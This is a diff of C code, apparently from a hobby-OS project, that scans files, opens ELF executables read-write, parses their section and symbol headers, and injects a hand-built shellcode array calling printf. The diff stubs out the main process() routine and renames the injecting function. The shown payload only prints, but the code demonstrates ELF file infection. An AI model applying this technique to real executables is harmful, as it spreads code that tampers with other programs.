@@ -56,7 +56,7 @@ int main() {
             if (n_cmp(tmp, "dev", 3) != 0 &&
                 n_cmp(tmp, "kernel.bin", 10) != 0) 
             {
-                process();
+                process(tmp);
             }
 // ifs:
             count = 0;
@@ -65,53 +65,16 @@ int main() {
     // __asm__ __volatile__("xchg %bx, %bx");
 }
 
-void xprocess(char *tmp)
+void process(char *tmp)
 {
-    Elf32_Shdr symtab_section_header;
-    Elf32_Shdr section_header;
-    // Elf32_Ehdr elf_ehdr;
-    Elf32_Shdr elf_shdr;
-    // Elf32_Sym elf_sym;
-
-    int old_file = open(tmp, O_RDWR);
-    read(old_file, &elf_header, sizeof(elf_ehdr));
-    if (!is_elf(elf_header)) return;
-
-    // int e_sho_off = elf_ehdr.e_shoff;
-    printf("--modifying\n");
-
-
-    int e_sho_off = elf_ehdr.e_shoff;
-    lseek(old_file, e_sho_off + sizeof(elf_shdr), SEEK_SET);
-    if (read(old_file, &elf_shdr, sizeof(elf_shdr)) != sizeof(elf_shdr)) printf("sizeof(elf_shdr)\n");
-    int text_offset = elf_shdr.sh_offset;
-    lseek(old_file, e_sho_off + sizeof(elf_shdr) * 7, SEEK_SET);
-    if (read(old_file, &elf_shdr, sizeof(elf_shdr)) != sizeof(elf_shdr)) printf("sizeof(elf_shdr)\n");
-    int str_offset = elf_shdr.sh_offset;
-    char str_buf[1000];
-    lseek(old_file, str_offset, SEEK_SET);
-    if(read(old_file, str_buf, sizeof(str_buf)) != sizeof(str_buf)) printf("sizeof(str_buf)\n");
-
-
-
-    for (int i = 0; i < elf_header.e_shnum; i++) {
-        if (lseek(old_file, elf_header.e_shoff + (i * sizeof(Elf32_Shdr)), SEEK_SET) == -1) printf("lseek error");
-        if (read(old_file, &section_header, sizeof(Elf32_Shdr)) != sizeof(Elf32_Shdr)) printf("Failed to read section header");
-
-        // Check if the section is the symbol table section
-        if (section_header.sh_type == SHT_SYMTAB) {
-            symtab_section_header = section_header;
-            break;
-        }
-    }
 }
 
-void process(char *tmp)
+void _process(char *tmp)
 {
     Elf32_Ehdr elf_ehdr;
     Elf32_Shdr elf_shdr;
     Elf32_Sym elf_sym;
-    
+
     int old_file = open(tmp, O_RDWR);
     read(old_file, &elf_ehdr, sizeof(elf_ehdr));
 
@@ -174,7 +137,7 @@ printf("name: %s\n", str_buf + elf_sym.st_name);
 
     char shellcode[] = {
         0x66, 0x87, 0xdb, 0x89, 0xe5, 0x83, 0xe4, 0xf0, 0x83, 0xec, 0x10, 0xc7, 0x04, 0x24,
-        data_addr[0],  data_addr[1],  data_addr[2],
+        data_addr[0], data_addr[1], data_addr[2],
         data_addr[3], 
         0xe8, 
         printf_off[0], printf_off[1], printf_off[2], printf_off[3],
